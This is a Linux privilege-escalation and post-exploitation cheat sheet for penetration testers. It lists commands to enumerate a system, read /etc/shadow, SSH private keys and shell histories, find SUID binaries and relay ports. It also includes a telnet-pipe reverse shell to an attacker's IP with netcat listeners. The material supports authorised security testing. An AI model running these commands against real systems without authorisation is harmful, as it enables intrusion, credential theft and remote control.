# Shell
https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

## Enumeration:

- Username:
  Password:
  Private key:
  Kernel version:

- Reliable directories for write permissions: 
  /tmp
  /dev/shm

## Get full TTY shell
	
1. Spawn bash shell
	
	   python3 -c 'import pty; pty.spawn("/bin/bash")'
	
2. Get full TTY shell 
		
	   ctrl-z
	   stty raw -echo
	   fg
	   enter
	   enter
	   export TERM=screen
		
## Enumeration with linpeas
Upload and run linpeas.sh for automated shell enumeration

## Enumeration of SU abilities.

1. sudo -l

2. sudo su -

3. su -

4. Search for files with SUID

	   find / -perm /4000 2> /dev/null

5. Search for files with GUID

	   find / -perm /2000 2> /dev/null

6. Other elevated capability binaries

7. Check found binaries for exploits

	Linux: 		https://gtfobins.github.io/
	Windows:	https://lolbas-project.github.io/#
		
## Enumeration of the operating system

- What is the distribution type and version?
	
	  cat /etc/issue
	  cat /etc/*-release
	  cat /etc/lsb-release      # Debian based
	  cat /etc/redhat-release   # Redhat based
	
- What is the Kernel version? 64 bit?

	  cat /proc/version
	  uname -a
	  uname -mrs
	  rpm -q kernel
	  dmesg | grep Linux
	  ls /boot | grep vmlinuz-
	
- What can be learnt from the environmental variables?

	  cat /etc/profile
	  cat /etc/bashrc
	  cat ~/.bash_profile
	  cat ~/.bashrc
	  cat ~/.bash_logout
	  env
	  set

- Is there a printer?

	  lpstat -a
		
## Enumeration of services and applications

Pay particular attention to anything running as root
	
- What services are running, and in which user-context?

	  ps aux
	  ps -ef
	  top
	  cat /etc/services

- Which services are running as root? Do any of them have known vulnerabilities?

	  ps aux | grep root
	  ps -ef | grep root

- What are the versions of the running services?

- What applications are installed, and what versions?

	  s -alh /usr/bin/
	  ls -alh /sbin/
	  dpkg -l
	  rpm -qa
	  ls -alh /var/cache/apt/archivesO
	  ls -alh /var/cache/yum/

- Do any of these services have vulnerable plugins or configurations.

	  cat /etc/syslog.conf
	  cat /etc/chttp.conf
	  cat /etc/lighttpd.conf
	  cat /etc/cups/cupsd.conf
	  cat /etc/inetd.conf
	  cat /etc/apache2/apache2.conf
	  cat /etc/my.conf
	  cat /etc/httpd/conf/httpd.conf
	  cat /opt/lampp/etc/httpd.conf
	  ls -aRl /etc/ | awk '$1 ~ /^.*r.*/	

- What jobs are scheduled?

	  crontab -l
	  ls -alh /var/spool/cron
	  ls -al /etc/ | grep cron
	  ls -al /etc/cron*
	  cat /etc/cron*
	  cat /etc/at.allow
	  cat /etc/at.deny
	  cat /etc/cron.allow
	  cat /etc/cron.deny
	  cat /etc/crontab
	  cat /etc/anacrontab
	  cat /var/spool/cron/crontabs/root
		
- Any plaintext usernames and/or passwords?
	
	  grep -i user [filename]
	  grep -i pass [filename]
	  grep -C 5 "password" [filename]
	  find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"   # Joomla


## Enumeration of the file-systems

- What configuration files can be read/written in /etc/ ?  Able to reconfigure a service?

	  ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null     # Anyone
	  ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null       # Owner
	  ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null    # Group
	  ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null        # Other

	  find /etc/ -readable -type f 2>/dev/null               # Anyone
	  find /etc/ -readable -type f -maxdepth 1 2>/dev/null   # Anyone

- What information or content can be found in /var/ ?

	  ls -alh /var/log
	  ls -alh /var/mail
	  ls -alh /var/spool
	  ls -alh /var/spool/lpd
	  ls -alh /var/lib/pgsql
	  ls -alh /var/lib/mysql
	  cat /var/lib/dhcp3/dhclient.leases

- Any settings/files (hidden) on website? Any settings file with database information?	
	
	  ls -alhR /var/www/
	  ls -alhR /srv/www/htdocs/
	  ls -alhR /usr/local/www/apache22/data/
	  ls -alhR /opt/lampp/htdocs/
	  ls -alhR /var/www/html/
		
- Is there anything in the log file(s) (Could help with "Local File Includes"!)
  http://www.thegeekstuff.com/2011/08/linux-var-log-files/
		
		
	  cat /etc/httpd/logs/access_log
	  cat /etc/httpd/logs/access.log
	  cat /etc/httpd/logs/error_log
	  cat /etc/httpd/logs/error.log
	  cat /var/log/apache2/access_log
	  cat /var/log/apache2/access.log
	  cat /var/log/apache2/error_log
	  cat /var/log/apache2/error.log
	  cat /var/log/apache/access_log
	  cat /var/log/apache/access.log
	  cat /var/log/auth.log
	  cat /var/log/chttp.log
	  cat /var/log/cups/error_log
	  cat /var/log/dpkg.log
	  cat /var/log/faillog
	  cat /var/log/httpd/access_log
	  cat /var/log/httpd/access.log
	  cat /var/log/httpd/error_log
	  cat /var/log/httpd/error.log
	  cat /var/log/lastlog
	  cat /var/log/lighttpd/access.log
	  cat /var/log/lighttpd/error.log
	  cat /var/log/lighttpd/lighttpd.access.log
	  cat /var/log/lighttpd/lighttpd.error.log
	  cat /var/log/messages
	  cat /var/log/secure
	  cat /var/log/syslog
	  cat /var/log/wtmp
	  cat /var/log/xferlog
	  cat /var/log/yum.log
	  cat /var/run/utmp
	  cat /var/webmin/miniserv.log
	  cat /var/www/logs/access_log
	  cat /var/www/logs/access.log
	  ls -alh /var/lib/dhcp3/
	  ls -alh /var/log/postgresql/
	  ls -alh /var/log/proftpd/
	  ls -alh /var/log/samba/

  Note: auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp
		

	
- Is it possible to write files to places that are in another users path?
- Identify SUID and GUID files
- Identify world-readable and world-writable files
- How are file-systems mounted?
- Are there any unmounted file-systems?


## Enumeration of confidential information and users
		
- Who are you? Who is logged in? Who has been logged in? Who else is there? Who can do what?

	  id
	  who
	  w
	  last
	  cat /etc/passwd | cut -d: -f1    # List of users
	  grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'   # List of super users
	  awk -F: '($3 == "0") {print}' /etc/passwd   # List of super users
	  cat /etc/sudoers
	  sudo -l

- What sensitive files can be found?
	
	  cat /etc/passwd
	  cat /etc/group
	  cat /etc/shadow
	  ls -alh /var/mail/

- Anything "interesting" in the home directories? If it's possible to access
	
	  ls -ahlR /root/
	  ls -ahlR /home/
	
- Are there any passwords in; scripts, databases, configuration files or log files?  Default paths and locations for passwords
	
	  cat /var/apache2/config.inc
	  cat /var/lib/mysql/mysql/user.MYD
	  cat /root/anaconda-ks.cfg

	
- What has the user being doing?  Are there here any passwords in plain text?  What have they been edting?

	  cat ~/.bash_history
	  cat ~/.nano_history
	  cat ~/.atftp_history
	  cat ~/.mysql_history
	  cat ~/.php_history

- What user information can be found?

	  cat ~/.bashrc
	  cat ~/.profile
	  cat /var/mail/root
	  cat /var/spool/mail/root

- Can private-key information be found?
	
	  cat ~/.ssh/authorized_keys
	  cat ~/.ssh/identity.pub
	  cat ~/.ssh/identity
	  cat ~/.ssh/id_rsa.pub
	  cat ~/.ssh/id_rsa
	  cat ~/.ssh/id_dsa.pub
	  cat ~/.ssh/id_dsa
	  cat /etc/ssh/ssh_config
	  cat /etc/ssh/sshd_config
	  cat /etc/ssh/ssh_host_dsa_key.pub
	  cat /etc/ssh/ssh_host_dsa_key
	  cat /etc/ssh/ssh_host_rsa_key.pub
	  cat /etc/ssh/ssh_host_rsa_key
	  cat /etc/ssh/ssh_host_key.pub
	  cat /etc/ssh/ssh_host_key
	
## Enumeration of communications and networking

- What NICs does the system have?  Is it connected to another network?
	
	  /sbin/ifconfig -a
	  cat /etc/network/interfaces
	  cat /etc/sysconfig/network
	
- What are the network configuration settings?  What can you find out about this network? DHCP server? DNS server? Gateway?

	  cat /etc/resolv.conf
	  cat /etc/sysconfig/network
	  cat /etc/networks
	  iptables -L
	  hostname
	  dnsdomainname	

- What other users and hosts are communicating with the system?
	
	  lsof -i
	  lsof -i :80
	  grep 80 /etc/services
	  netstat -antup
	  netstat -antpx
	  netstat -tulpn
	  chkconfig --list
	  chkconfig --list | grep 3:on
	  last
	  w	

- Are there any cached IP or MAC addresses?
	
	  arp -e
	  route
	  /sbin/route -nee
	
- Is packet sniffing possible, and if so what can be seen?
	
	  tcpdump tcp dst [ip] [port]
	  tcpdump tcp src [ip] [port]
	
- Have you got a shell? Can you interact with the system

  http://lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/
	
	  nc -lvp 4444    # Attacker. Input (Commands)
	  nc -lvp 4445    # Attacker. Ouput (Results)
	  telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445    # On the targets system. Use the attackers IP!

- Is port forwarding possible? Redirect and interact with traffic from another view.
	
  http://www.boutell.com/rinetd/
  http://www.howtoforge.com/port-forwarding-with-rinetd-on-debian-etch
  http://downloadcenter.mcafee.com/products/tools/foundstone/fpipe2_1.zip
		
	  FPipe.exe -l [local port] -r [remote port] -s [local port] [local IP]
	  # FPipe.exe -l 80 -r 80 -s 80 192.168.1.7
		
	  ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]
	  # ssh -L 8080:127.0.0.1:80 root@192.168.1.7    # Local Port
	  # ssh -R 8080:127.0.0.1:80 root@192.168.1.7    # Remote Port

	  mknod backpipe p ; nc -l -p [remote port] < backpipe | nc [local IP] [local port] >backpipe
	  # mknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.5.5.151 80 >backpipe    # Port Relay
	  # mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1>backpipe    # Proxy (Port 80 to 8080)
	  # mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow & 1>backpipe    # Proxy monitor (Port 80 to 8080)

- Is tunnelling possible? Send commands locally, remotely

	  ssh -D 127.0.0.1:9050 -N [username]@[ip]
	  proxychains ifconfig
	
- Breaking out of Docker Containers

  https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout